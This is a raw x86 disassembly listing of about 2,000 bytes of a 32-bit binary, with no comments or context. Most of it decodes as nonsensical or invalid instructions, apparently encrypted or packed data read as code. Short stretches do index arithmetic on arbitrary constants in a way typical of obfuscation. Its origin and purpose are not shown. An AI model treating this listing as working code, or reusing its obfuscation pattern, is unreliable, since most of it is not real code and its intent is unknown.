  4108ae:	cvtps2pi mm3,QWORD PTR [ecx-0x685c8da5]
  4108b5:	add    edi,esi
  4108b7:	nop
  4108b8:	cwde   
  4108b9:	jbe    0x4108dc
  4108bb:	sbb    esi,DWORD PTR [eax-0x76]
  4108be:	sub    ch,BYTE PTR [eax+0x2f]
  4108c1:	sub    BYTE PTR [edx+eiz*8+0x6f],cl
  4108c5:	es xor bl,al
  4108c8:	je     0x4108a9
  4108ca:	add    DWORD PTR [ebp+0x2d],eax
  4108cd:	(bad)  
  4108ce:	jl     0x4108eb
  4108d0:	sar    BYTE PTR ss:[ebp-0xe3ccc40],1
  4108d7:	mov    ebx,0x36ac91d2
  4108dc:	xor    DWORD PTR [ecx+esi*4],eax
  4108df:	aam    0x28
  4108e1:	sahf   
  4108e2:	out    0x8e,al
  4108e4:	and    ah,BYTE PTR ds:0x2f79ac80
  4108ea:	mov    ds:0xc55debc3,al
  4108ef:	jo     0x4108ac
  4108f1:	lods   al,BYTE PTR ds:[esi]
  4108f2:	jbe    0x410938
  4108f4:	push   cs
  4108f5:	inc    eax
  4108f6:	aad    0xb3
  4108f8:	jno    0x4108b6
  4108fa:	push   ebp
  4108fb:	outs   dx,DWORD PTR ds:[esi]
  4108fc:	call   0x94cd:0x635013d4
  410903:	pop    ds
  410904:	sbb    eax,0x410daf87
  410909:	test   DWORD PTR [ebx-0x78b4219f],edx
  41090f:	xor    eax,0xbd4fdc99
  410914:	retf   
  410915:	fs or  al,0x81
  410918:	dec    edx
  410919:	loop   0x4108bb
  41091b:	mov    bl,0xec
  41091d:	aaa    
  41091e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41091f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410920:	rol    DWORD PTR [ebx+0x15335b0e],1
  410926:	cmp    DWORD PTR [edx+edx*2],edi
  410929:	js     0x4109a4
  41092b:	or     DWORD PTR ds:0x9a8648b7,edi
  410931:	std    
  410932:	mov    al,ds:0xad4f4757
  410937:	test   al,0x5c
  410939:	ror    ch,1
  41093b:	mov    dh,0x9e
  41093d:	and    eax,0x7e0d9e7c
  410942:	cmp    esp,DWORD PTR [eax+0x612224f7]
  410948:	inc    eax
  410949:	jmp    0x4109b6
  41094b:	std    
  41094c:	push   0xd1ef067d
  410951:	push   edi
  410952:	les    ecx,FWORD PTR [edx]
  410954:	sbb    al,0x3a
  410956:	pop    edi
  410957:	push   eax
  410958:	div    DWORD PTR [edi+ebx*8+0x1db31cce]
  41095f:	daa    
  410960:	jmp    0x41097b
  410962:	dec    edi
  410963:	pusha  
  410964:	jle    0x410971
  410966:	arpl   WORD PTR [ebx],bx
  410968:	out    dx,al
  410969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41096a:	mov    BYTE PTR [eax+edi*4+0x5f],ah
  41096e:	adc    bh,BYTE PTR [edi+0x5d]
  410971:	jmp    0x4109ef
  410973:	lods   eax,DWORD PTR ds:[esi]
  410974:	test   dl,ah
  410976:	mov    eax,ecx
  410978:	push   ds
  410979:	test   edi,0x7be818a3
  41097f:	xlat   BYTE PTR ds:[ebx]
  410980:	(bad)  
  410981:	sub    BYTE PTR [edi],al
  410983:	in     eax,dx
  410984:	push   ebx
  410985:	hlt    
  410986:	or     edi,DWORD PTR [ebp+0x4a367093]
  41098c:	adc    eax,0xd70eebf0
  410991:	push   eax
  410992:	pop    ss
  410993:	pop    esp
  410994:	push   edx
  410995:	int    0xaa
  410997:	sub    al,0x44
  410999:	inc    esi
  41099a:	fistp  QWORD PTR [edi]
  41099c:	mov    ds:0x6024a58c,eax
  4109a1:	ffreep st(3)
  4109a3:	es ja  0x410929
  4109a6:	pop    ecx
  4109a7:	ja     0x41097c
  4109a9:	adc    ah,BYTE PTR [edi]
  4109ab:	xor    bh,BYTE PTR [ecx-0x7095ec20]
  4109b1:	mov    ds:0xb830ab3c,al
  4109b6:	pop    esp
  4109b7:	mov    edx,0xd8e387a
  4109bc:	les    ebx,FWORD PTR [eax+0x0]
  4109bf:	add    BYTE PTR [ecx+0x7a7af2],al
  4109c5:	add    BYTE PTR ds:0x5278,dh
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x4220ab
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x4220ab
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xaae91a4a
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [ecx+0x29294f57],bh
  410a81:	lods   al,BYTE PTR ds:[esi]
  410a82:	jb     0x410aa0
  410a84:	cmp    bh,BYTE PTR [esi-0x40]
  410a87:	cld    
  410a88:	sar    ebx,cl
  410a8a:	nop
  410a8b:	ret    
  410a8c:	lock xchg DWORD PTR [eax],edi
  410a8f:	iret   
  410a90:	mov    cl,0xb2
  410a92:	fnstsw WORD PTR [edi-0x15c76f6c]
  410a98:	popa   
  410a99:	fadd   QWORD PTR [ebx]
  410a9b:	mov    al,0x65
  410a9e:	popf   
  410a9f:	xor    DWORD PTR [bp+si],0xa798db8
  410aa6:	xor    bh,BYTE PTR [esp+esi*1-0x68d24388]
  410aad:	cmp    DWORD PTR [esi],0x96bb75b7
  410ab3:	cmp    eax,0x2d5eca99
  410ab8:	dec    ebp
  410ab9:	xchg   esi,eax
  410aba:	arpl   bp,cx
  410abc:	imul   BYTE PTR [edx+edx*1+0x55]
  410ac0:	adc    DWORD PTR [ebx+eiz*4-0x52b03d1f],ebx
  410ac7:	and    al,0x83
  410ac9:	mov    esp,0x19d1772e
  410ace:	mov    ebx,?
  410ad0:	mov    cl,0xd3
  410ad2:	ror    BYTE PTR [edi+edi*1-0x150726b2],1
  410ad9:	xor    ch,0x5a
  410adc:	call   FWORD PTR [esp+0x3a760478]
  410ae3:	mul    ah
  410ae5:	mov    esi,0x9659da50
  410aea:	push   0xe7ef2d1c
  410aef:	inc    esi
  410af0:	scas   eax,DWORD PTR es:[edi]
  410af1:	pusha  
  410af2:	stos   BYTE PTR es:[edi],al
  410af3:	(bad)  
  410af4:	mov    al,0x4e
  410af6:	outs   dx,BYTE PTR ds:[esi]
  410af7:	in     al,0x3f
  410af9:	cdq    
  410afa:	push   ds
  410afb:	mov    al,ds:0x89f6c4d9
  410b00:	pop    edi
  410b01:	sub    eax,0xd12fb78c
  410b06:	push   ebx
  410b07:	sub    ecx,esp
  410b09:	fs call 0xff3af9e7
  410b0f:	enter  0x13e4,0x74
  410b13:	and    BYTE PTR [ebx-0x20],dl
  410b16:	jb     0x410b17
  410b18:	imul   edx,DWORD PTR ds:0x215f2edf,0x99b9c7aa
  410b22:	call   0x72e8:0xa4efa8f8
  410b29:	sub    edi,DWORD PTR [eax+0x65c0cbf1]
  410b2f:	leave  
  410b30:	test   DWORD PTR [ecx],ecx
  410b32:	sbb    eax,0xb4a804b0
  410b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b38:	mov    ecx,0xc605093e
  410b3d:	rcr    ah,1
  410b3f:	add    dh,dh
  410b41:	xchg   esi,eax
  410b42:	lea    edi,[ebp+ebp*1-0xa]
  410b46:	adc    eax,0x1229ffb7
  410b4b:	lods   eax,DWORD PTR gs:[esi]
  410b4d:	xor    eax,0xded92cbe
  410b52:	sub    bl,BYTE PTR [ebx+eax*4-0x15e4ae82]
  410b59:	inc    ebx
  410b5a:	lahf   
  410b5b:	dec    esp
  410b5c:	push   0xcc400433
  410b61:	imul   esp,DWORD PTR [eax+0x22c39e19],0xe5a7d2a3
  410b6b:	cmp    eax,0x8d212232
  410b70:	into   
  410b71:	mov    ecx,0x36b45e51
  410b76:	mov    eax,0xe437b563
  410b7b:	xchg   esi,eax
  410b7c:	adc    ebx,DWORD PTR [ecx+0x30a5f32c]
  410b82:	test   BYTE PTR [edx],0xc1
  410b85:	jmp    0x44f3:0x4ac2e1ef
  410b8c:	in     eax,0xb6
  410b8e:	idiv   ebx
  410b90:	dec    ecx
  410b91:	stc    
  410b92:	ss and al,0xb1
  410b95:	fwait
  410b96:	mov    ecx,0xc67a3225
  410b9b:	or     al,0xbd
  410b9d:	gs jge 0x410b91
  410ba0:	add    eax,0x37b63a5a
  410ba5:	dec    edx
  410ba6:	cdq    
  410ba7:	out    0x65,eax
  410ba9:	sti    
  410baa:	push   esp
  410bab:	inc    esp
  410bac:	xchg   edx,eax
  410bad:	add    al,0xfc
  410baf:	std    
  410bb0:	push   esi
  410bb1:	sbb    eax,0xac879408
  410bb6:	inc    eax
  410bb7:	add    al,0xf4
  410bb9:	dec    edx
  410bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bbb:	mov    al,0xca
  410bbd:	dec    edx
  410bbe:	or     al,0x69
  410bc0:	fldenv [eax-0x4ac97664]
  410bc6:	ds xchg esp,eax
  410bc8:	imul   edi,DWORD PTR ds:0xc07597b6,0xdf1784bd
  410bd2:	out    dx,eax
  410bd3:	add    ebx,eax
  410bd5:	call   0x891d33dc
  410bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bdb:	ds ror bh,0xff
  410bdf:	stc    
  410be0:	(bad)  
  410be1:	adc    ch,dl
  410be3:	and    eax,0xbef964bc
  410be8:	xchg   DWORD PTR [eax],ecx
  410bea:	cmp    BYTE PTR [edi+0x3559c5fa],cl
  410bf0:	xchg   edi,eax
  410bf1:	in     al,0x33
  410bf3:	mov    dl,0xa
  410bf5:	popa   
  410bf6:	inc    ebp
  410bf7:	test   al,0x6b
  410bf9:	fld    QWORD PTR [esi]
  410bfb:	push   ecx
  410bfc:	push   0x4b
  410bfe:	inc    esi
  410bff:	mov    cl,0x8c
  410c01:	cwde   
  410c02:	dec    edx
  410c03:	mov    eax,0x1c4abc1b
  410c08:	xchg   BYTE PTR [esi+0x69],ah
  410c0b:	gs ins DWORD PTR es:[edi],dx
  410c0d:	call   0x9e31:0x3c9fd77c
  410c14:	test   eax,0x4ba005a8
  410c19:	ins    BYTE PTR es:[edi],dx
  410c1a:	fnstenv [ecx]
  410c1c:	and    WORD PTR [edi+0x5a],dx
  410c20:	adc    ecx,edx
  410c22:	add    DWORD PTR [esi-0x67],0x5653e644
  410c29:	clc    
  410c2a:	icebp  
  410c2b:	loop   0x410bba
  410c2d:	push   cs
  410c2e:	add    BYTE PTR [esi+0x2fdfb655],ah
  410c34:	mov    ecx,DWORD PTR [edi-0x7720d875]
  410c3a:	xor    BYTE PTR [ebx+0x23c401c2],ah
  410c40:	inc    esp
  410c41:	mov    ecx,0xb50159fd
  410c46:	push   es
  410c47:	clc    
  410c48:	and    eax,0xc30e1fca
  410c4d:	in     eax,dx
  410c4e:	push   ss
  410c4f:	pop    ecx
  410c50:	out    0x9d,al
  410c52:	jecxz  0x410c78
  410c54:	ficom  DWORD PTR [eax]
  410c56:	sub    eax,0x924a6856
  410c5b:	dec    esp
  410c5c:	ror    edx,1
  410c5e:	or     ebx,edi
  410c60:	jp     0x410c2c
  410c62:	or     BYTE PTR [eax],bl
  410c64:	pushf  
  410c65:	mov    ds:0xe9a02f2f,al
  410c6a:	adc    eax,0x2e711c5e
  410c6f:	ss ins BYTE PTR es:[edi],dx
  410c71:	lahf   
  410c72:	xchg   edi,eax
  410c73:	icebp  
  410c74:	pop    ecx
  410c75:	lahf   
  410c76:	pop    ecx
  410c77:	mov    dh,0xc5
  410c79:	and    eax,0xf737137b
  410c7e:	jmp    0x80f2:0x6eb3371d
  410c85:	cmp    DWORD PTR [ebp-0x32049fc5],ebp
  410c8b:	sahf   
  410c8c:	dec    eax
  410c8d:	mov    dh,cl
  410c8f:	adc    al,0x53
  410c92:	in     al,dx
  410c93:	mov    edx,0x4f1a2039
  410c98:	leave  
  410c99:	in     eax,0x2b
  410c9b:	or     eax,0xe269e7e5
  410ca0:	mov    ah,0x16
  410ca2:	add    dl,ch
  410ca4:	cmp    DWORD PTR [eax-0x58151b77],edi
  410caa:	pushf  
  410cab:	jno    0x410d19
  410cad:	mov    bl,0x9d
  410caf:	and    cl,BYTE PTR [edx+0x1d642c02]
  410cb5:	fcomp  QWORD PTR [eax]
  410cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb8:	test   eax,0x84b40115
  410cbd:	lods   eax,DWORD PTR ds:[esi]
  410cbe:	repnz rcl al,1
  410cc1:	mov    esi,0xee4b5b4a
  410cc6:	sbb    BYTE PTR [edi],bh
  410cc8:	cdq    
  410cc9:	loopne 0x410c79
  410ccb:	inc    esi
  410ccc:	mov    al,0xaa
  410cce:	xor    al,dh
  410cd0:	call   0x2055:0x3315669d
  410cd7:	xor    DWORD PTR [ebp+0x3dbd54df],esi
  410cdd:	dec    BYTE PTR [ebx]
  410cdf:	(bad)  
  410ce0:	popa   
  410ce1:	ds cmp eax,0x2b2f4e4b
  410ce7:	and    BYTE PTR ds:0x7219e0eb,bl
  410ced:	lods   al,BYTE PTR ds:[esi]
  410cee:	clc    
  410cef:	cmp    eax,0x961e5e31
  410cf4:	ficomp DWORD PTR [ebp+0x45]
  410cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cf8:	sbb    bl,BYTE PTR [edx]
  410cfa:	jo     0x410d0f
  410cfc:	sbb    BYTE PTR [ebx],dl
  410cfe:	push   edx
  410cff:	retf   
  410d00:	in     eax,0x69
  410d02:	adc    eax,0xc37b05d6
  410d07:	or     ch,al
  410d09:	sti    
  410d0a:	ins    BYTE PTR es:[edi],dx
  410d0b:	cdq    
  410d0c:	xor    al,0x33
  410d0e:	je     0x410ced
  410d10:	(bad)  
  410d11:	mov    al,ds:0x88f51834
  410d16:	xchg   ecx,eax
  410d17:	cld    
  410d18:	cmp    ebx,ecx
  410d1a:	repz add al,0xcb
  410d1d:	jns    0x5555264c
  410d23:	mov    dl,0x75
  410d25:	inc    edi
  410d26:	jecxz  0x410d4a
  410d28:	jbe    0x410d28
  410d2a:	cmp    ecx,DWORD PTR [edx+0x0]
  410d2d:	mov    cl,0x68
  410d2f:	mov    bh,0x3f
  410d31:	pop    edx
  410d32:	xchg   esi,eax
  410d33:	mov    ah,0x7d
  410d35:	sbb    DWORD PTR [ecx],0x5
  410d38:	xchg   edx,eax
  410d39:	mov    BYTE PTR ds:0x2ff43661,dl
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xfffffff6
  410d65:	jmp    0x410d28
  410d67:	mov    al,0x6d
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0xac94:0x48181814
  410d73:	xor    DWORD PTR [eax+0x54c56dde],esi
  410d79:	inc    edx
  410d7a:	cld    
  410d7b:	neg    DWORD PTR [esi+0x16fdffb0]
  410d81:	lods   al,BYTE PTR ds:[esi]
  410d82:	lds    eax,FWORD PTR [eax+0x746e7cb1]
  410d88:	hlt    
  410d89:	push   es
  410d8a:	ss aas 
  410d8c:	loope  0x410d91
  410d8e:	jb     0x410db9
  410d90:	mov    ebx,0xec8e1ad0
  410d95:	sbb    eax,0x14051668
  410d9a:	adc    al,0x40
  410d9c:	scas   eax,DWORD PTR es:[edi]
  410d9d:	mov    bl,0x76
  410d9f:	not    DWORD PTR [edi]
  410da1:	add    dh,ch
  410da3:	(bad)  
  410da4:	cmp    eax,0x41bc200f
  410da9:	mov    edx,0x2733770f
  410dae:	popf   
  410daf:	cmp    esi,DWORD PTR ds:[ecx]
  410db2:	jbe    0x410d55
  410db4:	or     BYTE PTR [ebp+0x79d05f5b],ah
  410dba:	dec    esi
  410dbb:	jecxz  0x410d6e
  410dbd:	addr16 mov eax,ds:0x4b63
  410dc1:	ror    BYTE PTR ds:0x15164e75,1
  410dc7:	(bad)  
  410dc8:	fadd   DWORD PTR [eax+0x19]
  410dcb:	outs   dx,BYTE PTR ds:[esi]
  410dcc:	sub    bh,BYTE PTR [ecx]
  410dce:	xchg   ebp,eax
  410dcf:	call   0xc02d:0x406cc218
  410dd6:	cli    
  410dd7:	in     eax,0xc7
  410dd9:	xchg   esi,eax
  410dda:	jo     0x410dcf
  410ddc:	cmp    eax,0x4f987477
  410de1:	mov    ah,BYTE PTR [ebx-0x29cccfd1]
  410de7:	add    ecx,DWORD PTR [ebx+0x38ffb99f]
  410ded:	adc    eax,0xf5e3a4e
  410df2:	pop    eax
  410df3:	pop    esi
  410df4:	in     eax,dx
  410df5:	ror    DWORD PTR ds:0x31a432be,cl
  410dfb:	mov    BYTE PTR [esi+esi*1-0x719cb8ac],dh
  410e02:	xor    DWORD PTR [eax],ebx
  410e04:	mov    ch,0x47
  410e06:	push   ebp
  410e07:	sbb    al,0xfc
  410e09:	and    bl,BYTE PTR [ebp+0x24]
  410e0c:	cdq    
  410e0d:	or     DWORD PTR [eax+0x4641ffa3],ebp
  410e13:	or     al,BYTE PTR [ecx-0x3c]
  410e16:	test   bh,dh
  410e18:	xor    BYTE PTR [eax+0x8],bh
  410e1b:	es sbb al,0x39
  410e1e:	fwait
  410e1f:	pop    edi
  410e20:	adc    DWORD PTR [edi*1+0xcaab0ef],0x8fabdf52
  410e2b:	sti    
  410e2c:	push   DWORD PTR [ecx]
  410e2e:	mov    BYTE PTR [ecx],dh
  410e30:	cs push cs
  410e32:	pop    eax
  410e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e34:	inc    edx
  410e35:	cmp    eax,0xdb111d1d
  410e3a:	ror    BYTE PTR [ebp-0x7],1
  410e3d:	pop    ds
  410e3e:	pop    edx
  410e3f:	and    al,0x36
  410e41:	sbb    BYTE PTR [esi-0x15],bh
  410e44:	mov    bh,0xdb
  410e46:	pushf  
  410e47:	aam    0x32
  410e49:	xlat   BYTE PTR ds:[ebx]
  410e4a:	xchg   edx,eax
  410e4b:	add    al,0x9f
  410e4d:	ins    BYTE PTR es:[edi],dx
  410e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e4f:	sub    ebx,DWORD PTR [eax-0x2460b7a5]
  410e55:	faddp  st(0),st
  410e57:	sbb    al,BYTE PTR [esi+ebx*4+0x17796cc9]
  410e5e:	push   0x75
  410e60:	cs cs inc eax
  410e63:	pop    eax
  410e64:	inc    ebx
  410e65:	call   0xa2c409a9
  410e6a:	xchg   edx,eax
  410e6b:	cli    
  410e6c:	sub    edx,DWORD PTR [edx]
  410e6e:	push   cs
  410e6f:	jbe    0x410eb8
  410e71:	nop
  410e72:	inc    esp
  410e73:	jmp    0x410e05
  410e75:	xchg   esi,eax
  410e76:	pusha  
  410e77:	push   DWORD PTR [edx-0x77]
  410e7a:	or     eax,DWORD PTR [ecx+edi*8-0x526626a0]
  410e81:	mov    dl,0x38
  410e83:	mov    cl,BYTE PTR [ecx+edi*2-0x6d]
  410e87:	pusha  
  410e88:	rcr    DWORD PTR [ecx-0x1e],0xe5
  410e8c:	xor    DWORD PTR ds:[eax],edx
  410e8f:	sub    al,0x37
  410e91:	xor    ebx,DWORD PTR [ecx-0x1a05ab5c]
  410e97:	fisubr WORD PTR [ecx]
  410e99:	or     BYTE PTR [eax-0x75],0xcc
  410e9d:	adc    ebp,DWORD PTR [eax-0x50]
  410ea0:	cld    
  410ea1:	push   ebx
  410ea2:	adc    eax,0xa6b7b1f2
  410ea7:	cmp    BYTE PTR [eax+0x15],ch
  410eaa:	sub    ebx,DWORD PTR ds:0x41cf8a6e
  410eb0:	icebp  
  410eb1:	sub    DWORD PTR [edx-0xd],ebp
  410eb4:	jne    0x410f17
  410eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb7:	ins    DWORD PTR es:[edi],dx
  410eb8:	ins    DWORD PTR es:[edi],dx
  410eb9:	leave  
  410eba:	icebp  
  410ebb:	(bad)  [edi]
  410ebe:	inc    ecx
  410ebf:	mov    eax,ds:0x22690f01
  410ec4:	and    eax,0x3dcd1ba0
  410ec9:	mov    ah,0x4f
  410ecb:	pop    ss
  410ecc:	pop    edi
  410ecd:	(bad)  
  410ece:	sub    dh,BYTE PTR ss:0x8fcafe7f
  410ed5:	pop    ecx
  410ed6:	les    ebx,FWORD PTR [edi+0x25]
  410ed9:	adc    BYTE PTR [ebp+0x3831bda7],dl
  410edf:	lods   al,BYTE PTR ds:[esi]
  410ee0:	xchg   edi,eax
  410ee1:	ins    DWORD PTR es:[edi],dx
  410ee2:	shl    BYTE PTR [ecx],1
  410ee4:	sub    BYTE PTR [edi-0x67],cl
  410ee7:	mov    gs,WORD PTR [ebx]
  410ee9:	lahf   
  410eea:	in     al,0x58
  410eec:	outs   dx,BYTE PTR ds:[esi]
  410eed:	ret    0x752c
  410ef0:	mov    eax,0x5505002f
  410ef5:	mov    eax,ds:0xd7171a6
  410efa:	add    eax,0xcd17dc8
  410eff:	(bad)  
  410f00:	push   ss
  410f01:	in     eax,0x97
  410f03:	jbe    0x410eef
  410f05:	ss js  0x410eb8
  410f08:	push   ecx
  410f09:	add    DWORD PTR [ecx+0x23],edx
  410f0c:	ret    0x820
  410f0f:	rcr    ch,1
  410f11:	and    bl,BYTE PTR ds:0x95111076
  410f17:	(bad)  
  410f18:	ficomp WORD PTR [ecx*2-0x19007e4f]
  410f1f:	or     BYTE PTR [edx-0x80],al
  410f22:	mov    esp,DWORD PTR [edx+edx*4+0x4]
  410f26:	push   edx
  410f27:	arpl   WORD PTR [edx+0x457589aa],ax
  410f2d:	inc    eax
  410f2e:	mov    ds:0xad7dad39,eax
  410f33:	retf   0xf6a6
  410f36:	fst    st(2)
  410f38:	mov    ebx,0xf54ff526
  410f3d:	add    ebp,DWORD PTR [edx-0x3b]
  410f40:	push   ds
  410f41:	shl    DWORD PTR [edx+0x19],1
  410f44:	out    dx,al
  410f45:	dec    esp
  410f46:	mov    edx,0x1022c2b2
  410f4b:	int    0x18
  410f4d:	and    al,0xfe
  410f4f:	pusha  
  410f50:	sub    bl,BYTE PTR [eax+eiz*2+0x260eaa71]
  410f57:	in     eax,dx
  410f58:	ret    0xe82c
  410f5b:	dec    edi
  410f5c:	inc    ebp
  410f5d:	push   edx
  410f5e:	gs or  eax,0x16d90c78
  410f64:	adc    BYTE PTR [esi+edi*2],0x99
  410f68:	(bad)
  410f6b:	(bad)  
  410f6c:	out    dx,al
  410f6d:	mov    edi,0xe6c4efc4
  410f72:	sti    
  410f73:	(bad)  
  410f74:	dec    eax
  410f75:	les    ebp,FWORD PTR [ebx+0x11b0e3f4]
  410f7b:	inc    ebx
  410f7c:	mov    BYTE PTR [esi-0x18],0xd1
  410f80:	pop    ebp
  410f81:	lahf   
  410f82:	or     al,0xa8
  410f84:	pop    ecx
  410f85:	sbb    DWORD PTR [esi],esp
  410f87:	xchg   bh,ch
  410f89:	sub    ebx,DWORD PTR [ebp-0x3a]
  410f8c:	dec    esi
  410f8d:	mov    BYTE PTR [edx],ch
  410f8f:	int3   
  410f90:	leave  
  410f91:	out    0x85,al
  410f93:	pop    es
  410f94:	sbb    BYTE PTR [edi+0x48],dl
  410f97:	stc    
  410f98:	jo     0x410f66
  410f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f9b:	mov    esi,0xccf23432
  410fa0:	pop    ebp
  410fa1:	pusha  
  410fa2:	imul   edx,DWORD PTR [edi],0xfffffffb
  410fa5:	imul   ebp,DWORD PTR [eax-0x55],0x31e680ed
  410fac:	xchg   ecx,eax
  410fad:	shl    BYTE PTR [eax+edx*4],1
  410fb0:	test   DWORD PTR [ecx-0x33164692],eax
  410fb6:	cmc    
  410fb7:	cld    
  410fb8:	cmp    bh,BYTE PTR [edx-0x3ddd5a7b]
  410fbe:	sbb    BYTE PTR [edi-0x35],dh
  410fc1:	jp     0x410ff6
  410fc3:	add    bl,BYTE PTR [ebp-0x386524c7]
  410fc9:	jae    0x410fbf
  410fcb:	jnp    0x41101d
  410fcd:	cmp    eax,0x287ba128
  410fd2:	stos   DWORD PTR es:[edi],eax
  410fd3:	fist   DWORD PTR [eax]
  410fd5:	sbb    eax,0x60d0af4a
  410fda:	retf   0xfc3c
  410fdd:	xchg   esp,eax
  410fde:	inc    esi
  410fdf:	pavgw  mm2,QWORD PTR [ebp+0x719649f0]
  410fe6:	mov    ebp,0x2b369897
  410feb:	inc    ecx
  410fec:	jl     0x410f8f
  410fee:	(bad)  
  410fef:	cmp    eax,0x3756bf80
  410ff4:	cld    
  410ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ff6:	cmc    
  410ff7:	jbe    0x41102c
  410ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ffa:	mov    ds:0xdd69bfba,al
  410fff:	and    esp,0xfbd6b3e4
  411005:	loopne 0x410fce
  411007:	mov    WORD PTR [eax-0x2d2c3917],ds
  41100d:	ds pushf 
  41100f:	add    eax,0x9f6ed9ad
  411014:	scas   al,BYTE PTR es:[edi]
  411015:	jns    0x410fd4
  411017:	idiv   BYTE PTR [ebp+0x2888d4c6]
  41101d:	lods   eax,DWORD PTR ds:[esi]
  41101e:	daa    
  41101f:	inc    ebp
  411020:	out    dx,al
  411021:	cdq    
  411022:	push   es
  411023:	cmc    
  411024:	push   esi
  411025:	call   FWORD PTR [ebx]
  411027:	xchg   BYTE PTR [ecx-0x2f],dl
  41102a:	cmp    DWORD PTR [edi],ecx
  41102c:	hlt    
  41102d:	mov    ds:0x3603b73c,eax
  411032:	or     DWORD PTR [ebx-0x2dcc03b3],ecx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
